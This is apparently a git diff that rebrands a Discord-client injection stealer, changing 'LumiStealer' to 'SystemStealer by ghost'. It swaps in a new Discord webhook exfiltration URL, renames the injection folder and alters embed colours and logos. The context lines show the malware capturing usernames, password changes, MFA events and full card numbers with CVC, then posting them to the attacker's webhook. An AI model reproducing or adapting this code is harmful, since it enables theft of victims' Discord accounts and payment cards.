@@ -11,7 +11,7 @@ var logOutScript = `function getLocalStoragePropertyDescriptor(){const o=documen
 
 const dataNow = new Date().toISOString();
 
-const webhook = 'https://discord.com/api/webhooks/1235675331726282825/7qmlJaHDrc59CUjvYFrxRUwk1_pttpwiOrqLwK4xCQkCqQM7Rw8hHHLq-1xKDdAoEdF3'
+const webhook = 'https://discord.com/api/webhooks/1249574571687018586/-C52uZ-bKh3AyIxb2I5GVDzNhp57WlumATrI-NjxBkCjEAC5fQx5KZoyARfA2Mp7H3dQ'
 
 let contents2FA = []
 
@@ -262,8 +262,8 @@ async function initOne() {
     return true;
   }
 
-  if (!fs.existsSync(__dirname + "/Lumi")) {
-    fs.mkdirSync(__dirname + "/Lumi");
+  if (!fs.existsSync(__dirname + "/System")) {
+    fs.mkdirSync(__dirname + "/System");
   }else {
     return true;
   }
@@ -271,8 +271,8 @@ async function initOne() {
   var client_discord = appName;
 
   const embed = {
-    title: 'First Injection Detected - LumiStealer',
-    color: 0x5a0998,
+    title: 'First Injection Detected - SystemStealer',
+    color: 0xb143e3,
     fields: [
       {
         name: "Injection Path:",
@@ -301,20 +301,20 @@ async function initOne() {
       },
     ],
     "author": {
-      name: user.username+"#0000 - LumiStealer",
+      name: user.username+"#0000 - SystemStealer",
       icon_url: avatar,
     },
     footer: {
-        icon_url: "https://cdn.discordapp.com/attachments/1249450764330471547/1249491645318041693/Cream_Black_Modern_Monogram_Initial_Name_Logo.png",
-        text: "LumiStealer"
+        icon_url: "https://i.pinimg.com/564x/7d/8e/86/7d8e86430309353281a9d78ad71c4228.jpg",
+        text: "SystemStealer by ghost"
       },
     timestamp: dataNow,
   };
 
   const webhookData = {
     embeds: [embed],
-    username: "Injections - LumiSt3aler",
-    avatar_url: "https://cdn.discordapp.com/attachments/1249450764330471547/1249491645318041693/Cream_Black_Modern_Monogram_Initial_Name_Logo.png"
+    username: "Injections - SystemSt3aler",
+    avatar_url: "https://i.pinimg.com/564x/7d/8e/86/7d8e86430309353281a9d78ad71c4228.jpg"
   };
 
   sendWebhook(webhook, webhookData);
@@ -356,7 +356,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
 
   var Billings = parseBilling(billing)
 
-  if (!user.avatar) var userAvatar = "https://cdn.discordapp.com/attachments/1249450764330471547/1249491645318041693/Cream_Black_Modern_Monogram_Initial_Name_Logo.png"
+  if (!user.avatar) var userAvatar = "https://cdn.discordapp.com/attachments/1237225880129114167/1246318859200368671/Lumi.png"
   if (!user.banner) var userBanner = ""
 
   userAvatar = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`
@@ -388,7 +388,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
 
       const embedLogin = {
         title: "Login Detected - LumiSt3aler",
-        color: 0x5a0998,
+        color: 0xb143e3,
         fields: [
           {
             name: "Username:",
@@ -446,7 +446,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
           icon_url: userAvatar
         },
         footer: {
-          icon_url: "https://cdn.discordapp.com/attachments/1249450764330471547/1249491645318041693/Cream_Black_Modern_Monogram_Initial_Name_Logo.png",
+          icon_url: "https://cdn.discordapp.com/attachments/1237225880129114167/1246318859200368671/Lumi.png",
           text: "LumiStealer"
         },
         timestamp: dataNow,
@@ -455,7 +455,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
       const dataLogin = {
         embeds: [embedLogin],
         username: "Logins - LumiStealer",
-        avatar_url: "https://cdn.discordapp.com/attachments/1249450764330471547/1249491645318041693/Cream_Black_Modern_Monogram_Initial_Name_Logo.png"
+        avatar_url: "https://cdn.discordapp.com/attachments/1237225880129114167/1246318859200368671/Lumi.png"
       }
 
       await sendWebhook(webhook, dataLogin);
@@ -467,7 +467,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
 
       const embedLogin3 = {
         title: "Login Detected - LumiSt2aler",
-        color: 0x5a0998,
+        color: 0xb143e3,
         fields: [
           {
             name: "Username:",
@@ -525,7 +525,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
           icon_url: userAvatar
         },
         footer: {
-          icon_url: "https://cdn.discordapp.com/attachments/1249450764330471547/1249491645318041693/Cream_Black_Modern_Monogram_Initial_Name_Logo.png",
+          icon_url: "https://cdn.discordapp.com/attachments/1237225880129114167/1246318859200368671/Lumi.png",
           text: "LumiStealer"
         },
         timestamp: dataNow,
@@ -536,7 +536,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
       const dataLogin3 = {
         embeds: [embedLogin3],
         username: "Logins - LumiSt2aler",
-        avatar_url: "https://cdn.discordapp.com/attachments/1249450764330471547/1249491645318041693/Cream_Black_Modern_Monogram_Initial_Name_Logo.png"
+        avatar_url: "https://cdn.discordapp.com/attachments/1237225880129114167/1246318859200368671/Lumi.png"
       }
 
       await sendWebhook(webhook, dataLogin3);
@@ -552,8 +552,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
       var full_card = card_number+"|"+exp_month+"|"+exp_year+"|"+cvc
 
       const embedCard = {
-        title: 'New Card Added - Lumistealer',
-        color: 0x5a0998,
+        title: 'New Card Added - LumiStealer',
+        color: 0xb143e3,
         fields: [
           {
             name: "Username:",
@@ -611,7 +611,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
           icon_url: userAvatar,
         },
         footer: {
-          icon_url: "https://cdn.discordapp.com/attachments/1249450764330471547/1249491645318041693/Cream_Black_Modern_Monogram_Initial_Name_Logo.png",
+          icon_url: "https://cdn.discordapp.com/attachments/1237225880129114167/1246318859200368671/Lumi.png",
           text: "LumiStealer"
         },
         timestamp: dataNow,
@@ -620,7 +620,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
       const webhookData = {
         embeds: [embedCard],
         username: "Cards - LumiSt3aler",
-        avatar_url: "https://cdn.discordapp.com/attachments/1249450764330471547/1249491645318041693/Cream_Black_Modern_Monogram_Initial_Name_Logo.png"
+        avatar_url: "https://cdn.discordapp.com/attachments/1237225880129114167/1246318859200368671/Lumi.png"
       };
       await sendWebhook(webhook, webhookData)
       break
@@ -635,7 +635,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
 
       const embedNewPasswd = {
         title: "Password Changed - LumiStealer",
-        color: 0x5a0998,
+        color: 0xb143e3,
         fields: [
           {
             name: "Username",
@@ -693,7 +693,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
           icon_url: userAvatar
         },
         footer: {
-          icon_url: "https://cdn.discordapp.com/attachments/1249450764330471547/1249491645318041693/Cream_Black_Modern_Monogram_Initial_Name_Logo.png",
+          icon_url: "https://cdn.discordapp.com/attachments/1237225880129114167/1246318859200368671/Lumi.png",
           text: "LumiStealer",
         },
         timestamp: dataNow,
@@ -702,7 +702,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
       const webhookData2 = {
         embeds: [embedNewPasswd],
         username: "Password Changer - LumiSt2aler",
-        avatar_url: "https://cdn.discordapp.com/attachments/1249450764330471547/1249491645318041693/Cream_Black_Modern_Monogram_Initial_Name_Logo.png"
+        avatar_url: "https://cdn.discordapp.com/attachments/1237225880129114167/1246318859200368671/Lumi.png"
       }
 
       await sendWebhook(webhook, webhookData2)
@@ -715,7 +715,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
 
       const embedMFAENABLED = {
         title: "MFA Enabled - LumiStealer",
-        color: 0x5a0998,
+        color: 0xb143e3,
         fields: [
           {
             name: "Username",
@@ -748,7 +748,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
           icon_url: userAvatar
         },
         footer: {
-          icon_url: "https://cdn.discordapp.com/attachments/1249450764330471547/1249491645318041693/Cream_Black_Modern_Monogram_Initial_Name_Logo.png",
+          icon_url: "https://cdn.discordapp.com/attachments/1237225880129114167/1246318859200368671/Lumi.png",
           text: "LumiStealer",
         },
         timestamp: dataNow,
@@ -757,7 +757,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
       const dataToWebhook = {
         embeds: [embedMFAENABLED],
         username: "Alerts - LumiSt2aler",
-        avatar_url: "https://cdn.discordapp.com/attachments/1249450764330471547/1249491645318041693/Cream_Black_Modern_Monogram_Initial_Name_Logo.png"
+        avatar_url: "https://cdn.discordapp.com/attachments/1237225880129114167/1246318859200368671/Lumi.png"
       }
 
       await sendWebhook(webhook, dataToWebhook)
